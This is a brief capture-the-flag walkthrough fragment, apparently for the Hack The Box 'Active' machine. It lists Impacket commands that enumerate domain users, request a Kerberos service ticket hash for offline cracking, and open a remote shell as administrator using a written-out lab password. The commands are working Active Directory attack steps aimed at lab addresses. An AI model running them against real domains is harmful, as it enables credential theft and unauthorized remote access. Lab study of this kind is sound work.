# Impacket

**Impacket’s GetADUsers.py simplifies the process of enumerating domain user accounts.**

```bash
GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
```

**Impacket’s GetUserSPNs.py lets us request the TGS and extract the hash for offline cracking.**

```bash
GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.10
```

```bash
GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request
```

**Impacket’s wmiexec.py can be used to get a shell as active\administrator , and read root.txt**

```bash
wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
```
